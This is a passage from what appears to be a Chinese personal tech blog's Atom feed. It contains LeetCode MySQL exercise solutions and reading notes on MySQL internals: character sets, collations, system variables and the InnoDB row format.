class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select a.id, a.name</span><br><span class="line">from Students a</span><br><span class="line">where a.department_id not in (</span><br><span class="line">    select distinct id from Departments</span><br><span class="line">)</span><br><span class="line"># or</span><br><span class="line">select a.id, a.name</span><br><span class="line">from Students a left join Departments b</span><br><span class="line">on b.id &#x3D; a.department_id</span><br><span class="line">where b.id is null # 笛卡尔积，不存在的院系id会为null</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/activity-participants" target="_blank" rel="noopener">1355. 活动参与者</a></p><p><a href="https://leetcode-cn.com/problems/number-of-trusted-contacts-of-a-customer" target="_blank" rel="noopener">1364. 顾客的可信联系人数量</a></p><p><a href="https://leetcode-cn.com/problems/get-the-second-most-recent-activity" target="_blank" rel="noopener">1369. 获取最近第二次的活动</a></p><p><a href="https://leetcode-cn.com/problems/replace-employee-id-with-the-unique-identifier" target="_blank" rel="noopener">1378. 使用唯一标识码替换员工ID</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select a.unique_id, b.name from</span><br><span class="line">Employees b</span><br><span class="line">left join EmployeeUNI a</span><br><span class="line">on a.id &#x3D; b.id</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/total-sales-amount-by-year" target="_blank" rel="noopener">1384. 按年度列出销售总额</a></p><p><a href="https://leetcode-cn.com/problems/capital-gainloss" target="_blank" rel="noopener">1393. 股票的资本损益</a></p><p><a href="https://leetcode-cn.com/problems/customers-who-bought-products-a-and-b-but-not-c" target="_blank" rel="noopener">1398. 购买了产品 A 和产品 B 却没有购买产品 C 的顾客</a></p><p><a href="https://leetcode-cn.com/problems/top-travellers" target="_blank" rel="noopener">1407. 排名靠前的旅行者</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#写一段 SQL , 报告每个用户的旅行距离.</span><br><span class="line">#返回的结果表单, 以 travelled_distance 降序排列,</span><br><span class="line">#如果有两个或者更多的用户旅行了相同的距离, 那么再以 name 升序排列.</span><br><span class="line"></span><br><span class="line">select name, ifnull(dis,0) travelled_distance from</span><br><span class="line">(</span><br><span class="line">    select user_id id, sum(distance) dis</span><br><span class="line">    from Rides</span><br><span class="line">    group by user_id</span><br><span class="line">) t right join Users</span><br><span class="line">using(id)</span><br><span class="line">order by travelled_distance desc, name</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">select name, ifnull(sum(distance),0) travelled_distance from</span><br><span class="line">Users left join Rides</span><br><span class="line">on Users.id &#x3D; Rides.user_id</span><br><span class="line">group by Users.id</span><br><span class="line">order by travelled_distance desc, name</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/find-the-quiet-students-in-all-exams" target="_blank" rel="noopener">1412. 查找成绩处于中游的学生</a></p><p><a href="https://leetcode-cn.com/problems/npv-queries" target="_blank" rel="noopener">1421. 净现值查询</a></p><p><a href="https://leetcode-cn.com/problems/create-a-session-bar-chart" target="_blank" rel="noopener">1435. 制作会话柱状图</a></p><p><a href="https://leetcode-cn.com/problems/evaluate-boolean-expression" target="_blank" rel="noopener">1440. 计算布尔表达式的值</a></p><p><a href="https://leetcode-cn.com/problems/apples-oranges" target="_blank" rel="noopener">1445. 苹果和桔子</a></p><p><a href="https://leetcode-cn.com/problems/active-users" target="_blank" rel="noopener">1454. 活跃用户</a></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211206201340.png" alt="image-20211206201332507"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 参考MYSQL实现排名函数RANK，DENSE_RANK和ROW_NUMBER</span><br><span class="line"># 使用over子句中的排序语句对记录进行排序，然后按照这个顺序生成序号</span><br><span class="line">with table1 as</span><br><span class="line">(</span><br><span class="line">    select id, login_date, </span><br><span class="line">            dense_rank() over(partition by id order by login_date) rnk</span><br><span class="line">    from Logins</span><br><span class="line">) # 建立表名</span><br><span class="line">select distinct table1.id, name</span><br><span class="line">from table1 left join Accounts a</span><br><span class="line">on table1.id &#x3D; a.id</span><br><span class="line">group by id, date_sub(login_date, interval rnk day)</span><br><span class="line">having count(distinct login_date) &gt;&#x3D; 5</span><br><span class="line">order by id</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/rectangles-area" target="_blank" rel="noopener">1459. 矩形面积</a></p><p><a href="https://leetcode-cn.com/problems/calculate-salaries" target="_blank" rel="noopener">1468. 计算税后工资</a></p><p><a href="https://leetcode-cn.com/problems/sales-by-day-of-the-week" target="_blank" rel="noopener">1479. 周内每天的销售情况</a></p><p><a href="https://leetcode-cn.com/problems/group-sold-products-by-the-date" target="_blank" rel="noopener">1485. 按日期分组销售产品</a></p><p>group_concat()：group by 产生的同一个分组中的值连接起来，返回一个字符串结果。</p><ul><li>语法：<code>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator &#39;分隔符&#39;] )</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 编写一个 SQL 查询来查找每个日期、销售的不同产品的数量及其名称</span><br><span class="line">select sell_date, count(distinct product) num_sold, </span><br><span class="line">    group_concat(distinct product order by product separator &#39;,&#39;) products from Activities</span><br><span class="line">group by sell_date</span><br><span class="line">order by sell_date</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/friendly-movies-streamed-last-month" target="_blank" rel="noopener">1495. 上月播放的儿童适宜电影</a></p><p><a href="https://leetcode-cn.com/problems/countries-you-can-safely-invest-in" target="_blank" rel="noopener">1501. 可以放心投资的国家</a></p><p><a href="https://leetcode-cn.com/problems/customer-order-frequency" target="_blank" rel="noopener">1511. 消费者下单频率</a></p><p><a href="https://leetcode-cn.com/problems/find-users-with-valid-e-mails" target="_blank" rel="noopener">1517. 查找拥有有效邮箱的用户</a></p><p><a href="https://leetcode-cn.com/problems/patients-with-a-condition" target="_blank" rel="noopener">1527. 患某种疾病的患者</a></p><p><a href="https://leetcode-cn.com/problems/the-most-recent-three-orders" target="_blank" rel="noopener">1532. 最近的三笔订单</a></p><p><a href="https://leetcode-cn.com/problems/fix-product-name-format" target="_blank" rel="noopener">1543. 产品名称格式修复</a></p><p><a href="https://leetcode-cn.com/problems/the-most-recent-orders-for-each-product" target="_blank" rel="noopener">1549. 每件商品的最新订单</a></p><p><a href="https://leetcode-cn.com/problems/bank-account-summary" target="_blank" rel="noopener">1555. 银行账户概要</a></p><p><a href="https://leetcode-cn.com/problems/unique-orders-and-customers-per-month" target="_blank" rel="noopener">1565. 按月统计订单数与顾客数</a></p><p><a href="https://leetcode-cn.com/problems/warehouse-manager" target="_blank" rel="noopener">1571. 仓库经理</a></p><p><a href="https://leetcode-cn.com/problems/customer-who-visited-but-did-not-make-any-transactions" target="_blank" rel="noopener">1581. 进店却未进行过交易的顾客</a></p><p><a href="https://leetcode-cn.com/problems/bank-account-summary-ii" target="_blank" rel="noopener">1587. 银行账户概要 II</a></p><p><a href="https://leetcode-cn.com/problems/the-most-frequently-ordered-products-for-each-customer" target="_blank" rel="noopener">1596. 每位顾客最经常订购的商品</a></p><p><a href="https://leetcode-cn.com/problems/sellers-with-no-sales" target="_blank" rel="noopener">1607. 没有卖出的卖家</a></p><p><a href="https://leetcode-cn.com/problems/find-the-missing-ids" target="_blank" rel="noopener">1613. 找到遗失的ID</a></p><p><a href="https://leetcode-cn.com/problems/all-valid-triplets-that-can-represent-a-country" target="_blank" rel="noopener">1623. 三人国家代表队</a></p><p><a href="https://leetcode-cn.com/problems/percentage-of-users-attended-a-contest" target="_blank" rel="noopener">1633. 各赛事的用户注册率</a></p><p><a href="https://leetcode-cn.com/problems/hopper-company-queries-i" target="_blank" rel="noopener">1635. Hopper 公司查询 I</a></p><p><a href="https://leetcode-cn.com/problems/hopper-company-queries-ii" target="_blank" rel="noopener">1645. Hopper Company Queries II</a></p><p><a href="https://leetcode-cn.com/problems/hopper-company-queries-iii" target="_blank" rel="noopener">1651. Hopper Company Queries III</a></p><p><a href="https://leetcode-cn.com/problems/average-time-of-process-per-machine" target="_blank" rel="noopener">1661. 每台机器的进程平均运行时间</a></p><p><a href="https://leetcode-cn.com/problems/fix-names-in-a-table" target="_blank" rel="noopener">1667. 修复表中的名字</a></p><p><a href="https://leetcode-cn.com/problems/products-worth-over-invoices" target="_blank" rel="noopener">1677. 发票中的产品金额</a></p><p><a href="https://leetcode-cn.com/problems/invalid-tweets" target="_blank" rel="noopener">1683. 无效的推文</a></p><p><a href="https://leetcode-cn.com/problems/daily-leads-and-partners" target="_blank" rel="noopener">1693. 每天的领导和合伙人</a></p><p><a href="https://leetcode-cn.com/problems/number-of-calls-between-two-persons" target="_blank" rel="noopener">1699. 两人之间的通话次数</a></p><p><a href="https://leetcode-cn.com/problems/biggest-window-between-visits" target="_blank" rel="noopener">1709. 访问日期之间最大的空档期</a></p><p><a href="https://leetcode-cn.com/problems/count-apples-and-oranges" target="_blank" rel="noopener">1715. 苹果和橘子的个数</a></p><p><a href="https://leetcode-cn.com/problems/find-followers-count" target="_blank" rel="noopener">1729. 求关注者的数量</a></p><p><a href="https://leetcode-cn.com/problems/the-number-of-employees-which-report-to-each-employee" target="_blank" rel="noopener">1731. 每位经理的下属员工数量</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">round((sum(order_date &#x3D; customer_pref_delivery_date)&#x2F;count(*)*100), 2)</span><br><span class="line">immediate_percentage from Delivery</span><br><span class="line"></span><br><span class="line"># 或者avg 函数返回占比</span><br><span class="line">select </span><br><span class="line">round((avg(order_date &#x3D; customer_pref_delivery_date)*100), 2)</span><br><span class="line">immediate_percentage from Delivery</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/find-total-time-spent-by-each-employee" target="_blank" rel="noopener">1741. 查找每个员工花费的总时间</a></p><p><a href="https://leetcode-cn.com/problems/leetflex-banned-accounts" target="_blank" rel="noopener">1747. 应该被禁止的Leetflex账户</a></p><p><a href="https://leetcode-cn.com/problems/recyclable-and-low-fat-products" target="_blank" rel="noopener">1757. 可回收且低脂的产品</a></p><p><a href="https://leetcode-cn.com/problems/find-the-subtasks-that-did-not-execute" target="_blank" rel="noopener">1767. 寻找没有被执行的任务对</a></p><p><a href="https://leetcode-cn.com/problems/products-price-for-each-store" target="_blank" rel="noopener">1777. 每家商店的产品价格</a></p><p><a href="https://leetcode-cn.com/problems/grand-slam-titles" target="_blank" rel="noopener">1783. 大满贯数量</a></p><p><a href="https://leetcode-cn.com/problems/primary-department-for-each-employee" target="_blank" rel="noopener">1789. 员工的直属部门</a></p><p><a href="https://leetcode-cn.com/problems/rearrange-products-table" target="_blank" rel="noopener">1795. 每个产品在不同商店的价格</a></p><p><a href="https://leetcode-cn.com/problems/ad-free-sessions" target="_blank" rel="noopener">1809. 没有广告的剧集</a></p><p><a href="https://leetcode-cn.com/problems/find-interview-candidates" target="_blank" rel="noopener">1811. 寻找面试候选人</a></p><p><a href="https://leetcode-cn.com/problems/find-customers-with-positive-revenue-this-year" target="_blank" rel="noopener">1821. 寻找今年具有正收入的客户</a></p><p><a href="https://leetcode-cn.com/problems/maximum-transaction-each-day" target="_blank" rel="noopener">1831. 每天的最大交易</a></p><p><a href="https://leetcode-cn.com/problems/league-statistics" target="_blank" rel="noopener">1841. 联赛信息统计</a></p><p><a href="https://leetcode-cn.com/problems/suspicious-bank-accounts" target="_blank" rel="noopener">1843. 可疑银行账户</a></p><p><a href="https://leetcode-cn.com/problems/convert-date-format" target="_blank" rel="noopener">1853. 转换日期格式</a></p><p><a href="https://leetcode-cn.com/problems/orders-with-maximum-quantity-above-average" target="_blank" rel="noopener">1867. Orders With Maximum Quantity Above Average</a></p><p><a href="https://leetcode-cn.com/problems/calculate-special-bonus" target="_blank" rel="noopener">1873. 计算特殊奖金</a></p><p><a href="https://leetcode-cn.com/problems/group-employees-of-the-same-salary" target="_blank" rel="noopener">1875. 将工资相同的雇员分组</a></p><p><a href="https://leetcode-cn.com/problems/the-latest-login-in-2020" target="_blank" rel="noopener">1890. 2020年最后一次登录</a></p><p><a href="https://leetcode-cn.com/problems/page-recommendations-ii" target="_blank" rel="noopener">1892. 页面推荐Ⅱ</a></p><p><a href="https://leetcode-cn.com/problems/count-salary-categories" target="_blank" rel="noopener">1907. 按分类统计薪水</a></p><p><a href="https://leetcode-cn.com/problems/leetcodify-friends-recommendations" target="_blank" rel="noopener">1917. Leetcodify Friends Recommendations</a></p><p><a href="https://leetcode-cn.com/problems/leetcodify-similar-friends" target="_blank" rel="noopener">1919. 兴趣相同的朋友</a></p><p><a href="https://leetcode-cn.com/problems/confirmation-rate" target="_blank" rel="noopener">1934. Confirmation Rate</a></p><p><a href="https://leetcode-cn.com/problems/users-that-actively-request-confirmation-messages" target="_blank" rel="noopener">1939. Users That Actively Request Confirmation Messages</a></p><p><a href="https://leetcode-cn.com/problems/strong-friendship" target="_blank" rel="noopener">1949. Strong Friendship</a></p><p><a href="https://leetcode-cn.com/problems/all-the-pairs-with-the-maximum-number-of-common-followers" target="_blank" rel="noopener">1951. 查询具有最多共同关注者的所有两两结对组</a></p><p><a href="https://leetcode-cn.com/problems/employees-with-missing-information" target="_blank" rel="noopener">1965. 丢失信息的雇员</a></p><p><a href="https://leetcode-cn.com/problems/first-and-last-call-on-the-same-day" target="_blank" rel="noopener">1972. First and Last Call On the Same Day</a></p><p><a href="https://leetcode-cn.com/problems/employees-whose-manager-left-the-company" target="_blank" rel="noopener">1978. Employees Whose Manager Left the Company</a></p><p><a href="https://leetcode-cn.com/problems/find-cutoff-score-for-each-school" target="_blank" rel="noopener">1988. Find Cutoff Score for Each School</a></p><p><a href="https://leetcode-cn.com/problems/count-the-number-of-experiments" target="_blank" rel="noopener">1990. 统计实验的数量</a></p><p><a href="https://leetcode-cn.com/problems/the-number-of-seniors-and-juniors-to-join-the-company" target="_blank" rel="noopener">2004. The Number of Seniors and Juniors to Join the Company</a></p><p><a href="https://leetcode-cn.com/problems/the-number-of-seniors-and-juniors-to-join-the-company-ii" target="_blank" rel="noopener">2010. The Number of Seniors and Juniors to Join the Company II</a></p><p><a href="https://leetcode-cn.com/problems/number-of-accounts-that-did-not-stream" target="_blank" rel="noopener">2020. Number of Accounts That Did Not Stream</a></p><p><a href="https://leetcode-cn.com/problems/low-quality-problems" target="_blank" rel="noopener">2026. Low-Quality Problems</a></p><p><a href="https://leetcode-cn.com/problems/accepted-candidates-from-the-interviews" target="_blank" rel="noopener">2041. 面试中被录取的候选人</a></p><p><a href="https://leetcode-cn.com/problems/the-category-of-each-member-in-the-store" target="_blank" rel="noopener">2051. The Category of Each Member in the Store</a></p><p><a href="https://leetcode-cn.com/problems/account-balance" target="_blank" rel="noopener">2066. Account Balance</a></p><p><a href="https://leetcode-cn.com/problems/the-winner-university" target="_blank" rel="noopener">2072. The Winner University</a></p><p><a href="https://leetcode-cn.com/problems/the-number-of-rich-customers" target="_blank" rel="noopener">2082. 富有客户的数量</a></p><p><a href="https://leetcode-cn.com/problems/drop-type-1-orders-for-customers-with-type-0-orders" target="_blank" rel="noopener">2084. Drop Type 1 Orders for Customers With Type 0 Orders</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;SQL Select语句完整的执行顺序：&lt;/strong&gt; &lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;
      
    
    </summary>
    
    
      <category term="MySQL" scheme="https://blog.kaluna.top/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://blog.kaluna.top/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL是怎么运行的之读书笔记</title>
    <link href="https://blog.kaluna.top/2021/12/05/MySQL%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B9%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.kaluna.top/2021/12/05/MySQL%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B9%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2021-12-05T01:22:45.138Z</published>
    <updated>2021-12-05T06:23:00.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>nice~，学到蛮多的，搜罗了一堆网课还不如直接看书系统地过一遍知识点呢</p><h1 id="装作自己是个小白-——-重新认识MySQL"><a href="#装作自己是个小白-——-重新认识MySQL" class="headerlink" title="装作自己是个小白 —— 重新认识MySQL"></a>装作自己是个小白 —— 重新认识MySQL</h1><p>每一个运行着的程序也被称为一个<code>进程</code>。我们的<code>MySQL</code>服务器程序和客户端程序本质上都算是计算机上的一个<code>进程</code>，这个代表着<code>MySQL</code>服务器程序的进程也被称为<code>MySQL数据库实例</code>，简称<code>数据库实例</code>。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211204003108.png" alt="image-20211204003107231"></p><p>SHOW ENGINES;</p><p>其中的Support列表示该存储引擎是否可⽤，DEFAULT值代表是当 前服务器程序的默认存储引擎。Comment列是对存储引擎的⼀个描 述，。Transactions列代表该存储引擎是否⽀持事务处理。<strong>XA列代表着该存储引擎是否⽀持分布式事 务。Savepoints代表着该列是否⽀持部分事务回滚。</strong></p><h1 id="MySQL的调控按钮-——-启动选项和系统变量"><a href="#MySQL的调控按钮-——-启动选项和系统变量" class="headerlink" title="MySQL的调控按钮 —— 启动选项和系统变量"></a>MySQL的调控按钮 —— 启动选项和系统变量</h1><p>如果我 们在多个配置⽂件中设置了相同的启动选项，那以最后⼀个配置⽂件中的为准。</p><p>对于启动选项 来说，如果启动选项名由多个单词组成，各个单词之间⽤短划线-或 者下划线_连接起来都可以，但是对应的系统变量之间必须使⽤下划线_连接起来。</p><p>对于⼤部分系统变量来说，它们的值可以在服务器程序运⾏过程中进⾏动态修改⽽⽆需停⽌并重启服务器。</p><p>通过启动选项设置的系统变量的作⽤范围都是GLOBAL的， 也就是对所有客户端都有效的。</p><p>如果在设置系统变量的语句中省略了作 ⽤范围，默认的作⽤范围就是SESSION。</p><p>并不是所有系统变量都具有GLOBAL和SESSION的作⽤范围。</p><p>有些系统变量是只读的，并不能设置值。</p><p>由于状态变量是⽤来显示服务器程序运⾏状况的，所以它们的值只能 由服务器程序⾃⼰来设置，我们程序员是不能设置的。</p><h1 id="乱码的前世今生-——-字符集和比较规则"><a href="#乱码的前世今生-——-字符集和比较规则" class="headerlink" title="乱码的前世今生 —— 字符集和比较规则"></a>乱码的前世今生 —— 字符集和比较规则</h1><p>每种字符集对应若⼲种⽐较规则，每种字符集都有⼀种默认的⽐较规则。</p><p>MySQL有4个级别的字符集和⽐较规则，分别是：</p><p>服务器级别 数据库级别 表级别 列级别。</p><p>character_set_database 和 collation_database 这两个系统变 量是只读的，我们不能通过修改这两个变量的值⽽改变当前数据库的 字符集和⽐较规则。</p><p>同⼀个表中的不同的列也可以 有不同的字符集和⽐较规则。</p><p>只修改字符集，则⽐较规则将变为修改后的字符集默认的⽐较 规则。 只修改⽐较规则，则字符集将变为修改后的⽐较规则对应的字 符集。</p><p>不论哪个级别的字符集和⽐较规则，这两条规则都适⽤</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129210207.png" alt="image-20211129210203569"></p><p>从发送请求到返回结果这个过程中伴随着多 次字符集的转换，在这个过程中会⽤到3个系统变量，我们先把它们 写出来看⼀下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129210301.png" alt="image-20211129210259097"></p><p>假设你的客户端采⽤的字符集和 character_set_client 不⼀ 样的话，这就会出现意想不到的情况。</p><p>假设你的客户端采⽤的字符集和 character_set_results 不⼀ 样的话，这就会出现客户端⽆法解码结果集的情况。</p><p>character_set_connection只是服务器在处理请求时使⽤ 的字符集，它是什么其实没多重要，但是⼀定要注意，该字符 集包含的字符范围⼀定涵盖请求以及结果集中的字符，要不然 会出现⽆法将请求中的字符编码 成character_set_connection字符集或者⽆法编码结果集 中的字符。</p><p>我们通常都把 character_set_client 、character_set_connection、character_set_results 这三个 系统变量设置成和客户端使⽤的字符集⼀致的情况，这样减少了很多 ⽆谓的字符集转换。</p><p>总结</p><ol><li><p>字符集的是某个字符范围的编码规则。</p></li><li><p>⽐较规则是针对某个字符集中的字符⽐较⼤⼩的⼀种规则。</p></li><li><p>在MySQL中，⼀个字符集可以有若⼲种⽐较规则，其中有⼀个 默认的⽐较规则，⼀个⽐较规则必须对应⼀个字符集。</p></li><li><p>查看MySQL中查看⽀持的字符集和⽐较规则的语句如下：</p><p>SHOW (CHARACTER SET|CHARSET) [LIKE 匹配的模式];</p><p>SHOW COLLATION [LIKE 匹配的模式];</p><p>MySQL有四个级别的字符集和⽐较规则</p><p><strong>服务器级别</strong> character_set_server表示服务器级别的字符集，collation_server表示服务器级别的⽐较规则。</p><p><strong>数据库级别</strong> 创建和修改数据库时可以指定字符集和⽐较规则：</p><p>CREATE DATABASE 数据库名 [[DEFAULT] CHARACTER SET 字符集名称] [[DEFAULT] COLLATE ⽐较规则名称]; ALTER DATABASE 数据库名 [[DEFAULT] CHARACTER SET 字符集名称] [[DEFAULT] COLLATE ⽐较规则名称]; character_set_database表示当前数据库的字符集，collation_database表示当前默认数据库的⽐较规则，这两个系统变量是只读的，不能修改。如果没有指定当前 默认数据库，则变量与相应的服务器级系统变量具有相同的值。</p><p><strong>表级别</strong> 创建和修改表的时候指定表的字符集和⽐较规则：</p><p>CREATE TABLE 表名 (列的信息) [[DEFAULT] CHARACTER SET 字符集名称] [COLLATE ⽐较规则名称]]</p><p>ALTER TABLE 表名 [[DEFAULT] CHARACTER SET 字符集名称] [COLLATE ⽐较规则名称]</p><p><strong>列级别</strong> 创建和修改列定义的时候可以指定该列的字符集和⽐较规则：</p><p>CREATE TABLE 表名( 列名 字符串类型 [CHARACTER SET 字符集名称] [COLLATE ⽐较规则名称], 其他列… ); ALTER TABLE 表名 MODIFY 列名 字符串类型 [CHARACTER SET 字符集名称] [COLLATE ⽐较规则名 称];</p><p>从发送请求到接收结果过程中发⽣的字符集转换： 客户端使⽤操作系统的字符集编码请求字符串 服务器将客户端发送来的字符串的字符集按 照chacharacter_set_client转换 为character_set_connection。 使⽤character_set_connection进⾏服务器操作。 将结果集字符串的字符集从 character_set_connection转 为character_set_results发送到客户端 客户端使⽤操作系统的字符集解析收到的结果集字符串。</p><p>在这个过程中各个系统变量的含义如下： 系统变量描述 character_set_client 服务器解码请求时使⽤的字符集； character_set_connection 服务器运⾏过程中使⽤的字符集； character_set_results 服务器向客户端返回数据时使⽤的字符集。⼀般情况下要使⽤保持这三个变量的值和客户端使⽤的字符集相同。</p><p>⽐较规则的作⽤通常体现⽐较字符串⼤⼩的表达式以及对某个字符串列进⾏排序中。</p></li></ol><h1 id="从一条记录说起——-InnoDB-记录结构"><a href="#从一条记录说起——-InnoDB-记录结构" class="headerlink" title="从一条记录说起—— InnoDB 记录结构"></a>从一条记录说起—— InnoDB 记录结构</h1><p>将数据划 分为若⼲个⻚，以⻚作为磁盘和内存之间交互的基本单位，InnoDB 中⻚的⼤⼩⼀般为 16 KB</p><p>我们平时是以记录为单位来向表中插⼊数据的，这些记录在磁盘上的 存放⽅式也被称为⾏格式或者记录格式。设计InnoDB存储引擎的⼤ 叔们到现在为⽌设计了4种不同类型的⾏格式，分别 是Compact、Redundant、Dynamic和Compressed⾏格式</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129212221.png" alt="image-20211129212219555"></p><p>服务器为了描述这条记录⽽不得不额外添加的⼀些信 息，这些额外信息分为3类，分别是变⻓字段⻓度列表、NULL值列表 和记录头信息</p><p>各变⻓ 字段数据占⽤的字节数按照列的顺序<strong>逆序</strong>存放</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE record_format_demo (</span><br><span class="line">-&gt; c1 VARCHAR(10),</span><br><span class="line">-&gt; c2 VARCHAR(10) NOT NULL,</span><br><span class="line">-&gt; c3 CHAR(10),</span><br><span class="line">-&gt; c4 VARCHAR(10)</span><br><span class="line">-&gt; ) CHARSET&#x3D;ascii ROW_FORMAT&#x3D;COMPACT;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO record_format_demo(c1, c2, c3,</span><br><span class="line">c4) VALUES(&#39;aaaa&#39;,&#39;bbb&#39;,&#39;cc&#39;,&#39;d&#39;), (&#39;eeee&#39;,&#39;fff&#39;, NULL, NULL);</span><br><span class="line">Query OK, 2 rows affected (0.02 sec)</span><br><span class="line">Records: 2 Duplicates: 0 Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM record_format_demo;</span><br><span class="line">+------+-----+------+------+</span><br><span class="line">| c1 | c2 | c3 | c4 |</span><br><span class="line">+------+-----+------+------+</span><br><span class="line">| aaaa | bbb | cc | d |</span><br><span class="line">| eeee | fff | NULL | NULL |</span><br><span class="line">+------+-----+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129212337.png" alt="image-20211129212336102"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129212351.png" alt="image-20211129212350353"></p><p>InnoDB有它的⼀套 规则，我们⾸先声明⼀下W、M和L的意思</p><ol><li>假设某个字符集中表示⼀个字符最多需要使⽤的字节数为W， 也就是使⽤SHOW CHARSET语句的结果中的Maxlen列，⽐⽅ 说utf8字符集中的W就是3，gbk字符集中的W就是2，ascii 字符集中的W就是1。</li><li>对于变⻓类型VARCHAR(M)来说，这种类型表示能存储最多M 个字符（注意是字符不是字节），所以这个类型能表示的字符 串最多占⽤的字节数就是M×W。</li><li>假设它实际存储的字符串占⽤的字节数是L。</li></ol><p>所以确定使⽤1个字节还是2个字节表示真正字符串占⽤的字节数的 规则就是这样</p><p>总结⼀下就是说：如果该可变字段允许存储的最⼤字节数（M×W）超 过255字节并且真实存储的字节数（L）超过127字节，则使⽤2个字 节，否则使⽤1个字节。</p><p>变⻓字段⻓度列表中只存储值为 ⾮NULL 的列内容占⽤的⻓度，值为 NULL 的列的⻓度是不储存的</p><p>如果表中没有允许存储 NULL 的列，则 NULL值列表 也不存在 了，否则将每个允许存储NULL的列对应⼀个⼆进制位，⼆进制 位按照列的顺序逆序排列。</p><p>⼆进制位表示的意义如下： ⼆进制位的值为1时，代表该列的值为NULL。 ⼆进制位的值为0时，代表该列的值不为NULL。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129213333.png" alt="image-20211129213331998"></p><p>MySQL规定NULL值列表必须⽤整数个字节的位表示</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205141448.png" alt="image-20211129213408012"></p><p>第一条记录⽤⼗六进制表示就是：0x00</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129213453.png" alt="image-20211129213451149"></p><p>第二条记录⽤⼗六进制表示就是：0x06</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129213528.png" alt="image-20211129213526793"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129213641.png" alt="image-20211129213616100"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129213631.png" alt="image-20211129213628078"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095032.png" 